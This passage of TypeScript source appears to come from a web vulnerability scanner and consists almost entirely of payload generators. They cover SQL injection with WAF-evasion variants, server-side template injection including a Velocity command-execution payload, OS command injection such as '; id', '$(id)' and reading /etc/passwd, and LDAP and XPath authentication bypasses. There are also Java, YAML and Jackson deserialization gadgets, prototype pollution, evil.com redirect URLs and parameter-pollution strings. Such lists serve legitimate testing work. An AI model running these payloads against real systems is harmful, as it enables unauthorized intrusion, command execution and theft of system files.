  variants.push(payload.replace(/select/gi, 'SeLeCt').replace(/union/gi, 'UnIoN').replace(/and/gi, 'AnD').replace(/or/gi, 'Or'));
  // Comment-based whitespace (SELECT/**/name)
  variants.push(payload.replace(/\s+/g, '/**/'));
  // Tab/newline whitespace
  variants.push(payload.replace(/\s+/g, m => m === ' ' ? '\t' : m));
  // Nested comments (MySQL /*!50000SELECT*/)
  variants.push(payload.replace(/\b(select|union|and|or|from|where)\b/gi, '/*!50000$1*/'));
  // Concatenation splitting (SEL'ECT' → only useful in quoted contexts, keep raw)
  variants.push(payload.replace(/\s/g, '\n'));
  return [...new Set(variants)].slice(0, 8);
}

/** DB-specific error signatures useful after technology fingerprinting. */
export const DB_ERROR_SIGNATURES = {
  mysql: ['mysql', 'you have an error in your sql syntax', 'mariadb', 'warning: mysql_', 'sqlstate', 'mysqli'],
  postgresql: ['postgres', 'psql', 'pg_', 'syntax error at or near', 'invalid input syntax', 'pg_query'],
  mssql: ['sql server', 'mssql', 'line []', 'unclosed quotation mark', 'odbc sql server driver', 'microsoft ole db'],
  oracle: ['ora-[0-9]+', 'oracle', 'quoted string not properly terminated', 'sql command not properly ended'],
  sqlite: ['sqlite', 'sqlite3', 'malformed database', 'incomplete input'],
};

export function generateBooleanSQLiPayloads(): { label: string; okPayload: string; badPayload: string }[] {
  return [
    { label: 'AND-1=1 vs AND-1=2', okPayload: "' AND 1=1--", badPayload: "' AND 1=2--" },
    { label: 'OR-1=1 vs OR-1=2', okPayload: "' OR 1=1--", badPayload: "' OR 1=2--" },
    { label: 'numeric-1 vs 2', okPayload: '1', badPayload: '2' },
    { label: 'AND-false-paren', okPayload: "' AND (SELECT 1)=1--", badPayload: "' AND (SELECT 1)=2--" },
  ];
}

// ─── SSTI PAYLOAD GENERATORS ────────────────────────────────────────────────

export function generateSSTIPayloads(): { payload: string; indicator: string; type: string }[] {
  return [
    // Polyglot / basic detection
    { payload: '{{7*7}}', indicator: '49', type: 'basic-arithmetic' },
    { payload: '${7*7}', indicator: '49', type: 'jsp-el' },
    { payload: '#{7*7}', indicator: '49', type: 'thymeleaf-el' },
    { payload: '<%= 7*7 %>', indicator: '49', type: 'erb-jsp' },
    { payload: '{{7*\'7\'}}', indicator: '49', type: 'concat-string' },
    // Jinja2 / Twig
    { payload: '{{7*7}}', indicator: '49', type: 'jinja2-twig' },
    { payload: '{{config}}', indicator: 'SECRET_KEY|FLASK|APP_CONFIG|DEBUG', type: 'jinja2-config' },
    { payload: '{{self.__class__}}', indicator: 'class|flask|type', type: 'jinja2-class' },
    // Smarty
    { payload: '{$smarty.version}', indicator: 'Smarty|smarty|version', type: 'smarty-version' },
    { payload: '{php}echo 7*7;{/php}', indicator: '49', type: 'smarty-php' },
    // Velocity
    { payload: '#set($x=7*7)$x', indicator: '49', type: 'velocity-set' },
    { payload: '$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")', indicator: 'uid=|gid=', type: 'velocity-rce' },
    // FreeMarker
    { payload: '<#assign x=7*7>${x}', indicator: '49', type: 'freemarker-assign' },
    // SSTI polyglot
    { payload: '{{7*7}${7*7}<%=7*7%>#{7*7}}', indicator: '49', type: 'polyglot' },
    // Environment variable leak (blind marker style)
    { payload: '{{lipsum.__globals__}}', indicator: 'os|builtins|globals', type: 'jinja2-globals' },
    // Boolean condition test (detect template evaluation via conditional)
    { payload: '{% if 49 == 49 %}templated49{% endif %}', indicator: 'templated49', type: 'jinja2-condition' },
  ];
}

// ─── OS COMMAND INJECTION PAYLOAD GENERATORS ────────────────────────────────

export function generateOSCommandPayloads(): { payload: string; indicator: string; type: string }[] {
  return [
    // Basic detection - arithmetic/id-like outputs
    { payload: 'id', indicator: 'uid=|gid=|groups=', type: 'unix-id' },
    { payload: '; id', indicator: 'uid=|gid=|groups=', type: 'semicolon' },
    { payload: '| id', indicator: 'uid=|gid=|groups=', type: 'pipe' },
    { payload: '|| id', indicator: 'uid=|gid=|groups=', type: 'or-pipe' },
    { payload: '&& id', indicator: 'uid=|gid=|groups=', type: 'and-amp' },
    { payload: '`id`', indicator: 'uid=|gid=|groups=', type: 'backtick' },
    { payload: '$(id)', indicator: 'uid=|gid=|groups=', type: 'dollar-sub' },
    { payload: '${IFS}id', indicator: 'uid=|gid=|groups=', type: 'ifs-bypass' },
    { payload: '/bin/cat /etc/passwd', indicator: 'root:|/bin/bash|/bin/sh', type: 'cat-passwd' },
    { payload: 'whoami', indicator: 'root|admin|user|www-data', type: 'whoami' },
    { payload: 'hostname', indicator: '', type: 'hostname' },
    // Windows commands
    { payload: 'dir', indicator: 'Volume in drive|Directory of|bytes free', type: 'windows-dir' },
    { payload: '&& whoami', indicator: '', type: 'windows-whoami' },
    { payload: '| whoami', indicator: '', type: 'windows-whoami-pipe' },
    // Timing-based blind detection
    { payload: 'sleep 5', indicator: '', type: 'timeout-sleep' },
    { payload: 'ping -n 5 127.0.0.1', indicator: '', type: 'timeout-ping' },
    { payload: 'python -c "import time;time.sleep(5)"', indicator: '', type: 'timeout-python' },
  ];
}

// ─── LDAP INJECTION PAYLOADS ────────────────────────────────────────────────

export function generateLDAPPayloads(): { payload: string; indicator: string; type: string }[] {
  return [
    { payload: '*)', indicator: '', type: 'wildcard-breakout' },
    { payload: '*)(&', indicator: '', type: 'breakout-filter' },
    { payload: '*)(uid=*))(|(uid=*', indicator: '', type: 'filter-injection' },
    { payload: '|(uid=*', indicator: '', type: 'pipe-filter' },
    { payload: 'admin)(|(password=*)', indicator: '', type: 'auth-bypass' },
    { payload: 'admin*)(&', indicator: '', type: 'auth-bypass-2' },
    { payload: '*)(objectClass=*', indicator: '', type: 'objectclass-any' },
    { payload: 'x)(uid=*))(|(uid=*', indicator: '', type: 'complex-bypass' },
  ];
}

// ─── XPATH INJECTION PAYLOADS ───────────────────────────────────────────────

export function generateXPathPayloads(): { payload: string; indicator: string; type: string }[] {
  return [
    { payload: "' or '1'='1", indicator: 'valid|found|true|matches', type: 'auth-bypass' },
    { payload: "admin' and '1'='1", indicator: 'valid|found|true', type: 'valid-user' },
    { payload: "'] | //* | //*[", indicator: '', type: 'document-access' },
    { payload: "' or count(/node)=1 or 'a'='a", indicator: '', type: 'count-bypass' },
    { payload: "' or substring(//user[1]/password,1,1)='a", indicator: '', type: 'blind-extraction' },
    { payload: '*)*', indicator: '', type: 'wildcard' },
  ];
}

// ─── INSECURE DESERIALIZATION DETECTION PAYLOADS ────────────────────────────

export function generateDeserializationPayloads(): { payload: string; indicator: string; type: string }[] {
  return [
    // Java (object stream magic bytes indicators in response)
    { payload: 'rO0ABXNyAA5qYXZhLmxhbmcuU3RyaW5n', indicator: 'java|class|could not|deserialize', type: 'java-serialized' },
    // YAML (SnakeYAML RCE indicator)
    { payload: '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:1/"]]]]', indicator: 'org.yaml|snakeyaml|constructor', type: 'snakeyaml' },
    // Node / Python pickle markers
    { payload: 'yt0=', indicator: 'pickle|unpickle|marshal', type: 'python-pickle' },
    { payload: '_R MI', indicator: 'pickle|unpickle', type: 'python-reduce' },
    // PHP serialized object markers
    { payload: 'O:4:"test":0:{}', indicator: 'php|unserialize|deserialize', type: 'php-serialized' },
    // Java Spring / Jackson JSON gadget markers
    { payload: '["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://127.0.0.1:1/x","autoCommit":true}]', indicator: 'jackson|com.sun|deserialize', type: 'jackson-jdbcrowset' },
    // Ruby Marshal
    { payload: '\x04\x08o:\x04\x08Test\x00', indicator: 'ruby|marshal|unmarshal', type: 'ruby-marshal' },
  ];
}

// ─── SERVER-SIDE PROTOTYPE POLLUTION PAYLOADS ───────────────────────────────

export function generatePrototypePollutionPayloads(): { payload: string; indicator: string; type: string }[] {
  return [
    { payload: '{"__proto__":{"polluted":"true"}}', indicator: 'polluted', type: 'json-proto' },
    { payload: '{"constructor":{"prototype":{"polluted":"true"}}}', indicator: 'polluted', type: 'json-constructor' },
    { payload: '__proto__[polluted]=true', indicator: 'polluted', type: 'qs-form' },
    { payload: 'constructor[prototype][polluted]=true', indicator: 'polluted', type: 'qs-constructor' },
    { payload: '{"__proto__":{"status":200}}', indicator: '', type: 'proto-status' },
  ];
}

// ─── REFLECTED FILE DOWNLOAD / CRLF SPLITTING ───────────────────────────────

export function generateReflectedFileDownloadPayloads(): { payload: string; indicator: string; type: string }[] {
  return [
    { payload: 'data:text/html,<script>alert(1)</script>', indicator: 'attachment|filename|data:text/html', type: 'data-html' },
    { payload: 'javascript:alert(1)//', indicator: 'javascript:', type: 'javascript-uri' },
    { payload: 'http://evil.com/poc.html', indicator: 'evil.com', type: 'external-url' },
    { payload: '//evil.com', indicator: 'evil.com', type: 'protocol-relative' },
  ];
}

// ─── HTTP PARAMETER POLLUTION BYPASS PAYLOADS ───────────────────────────────

export function generateHPPPayloads(): { payload: string; indicator: string; type: string }[] {
  return [
    { payload: 'role=user&role=admin', indicator: 'admin', type: 'dual-value' },
    { payload: 'role=admin&role=user', indicator: 'admin', type: 'dual-value-reverse' },
    { payload: 'id=1&id=2', indicator: '2', type: 'last-wins' },
    { payload: 'role=\x00admin', indicator: 'admin', type: 'null-byte' },
    { payload: 'foo=bar&foo[]=baz', indicator: '', type: 'array-coercion' },
  ];
}
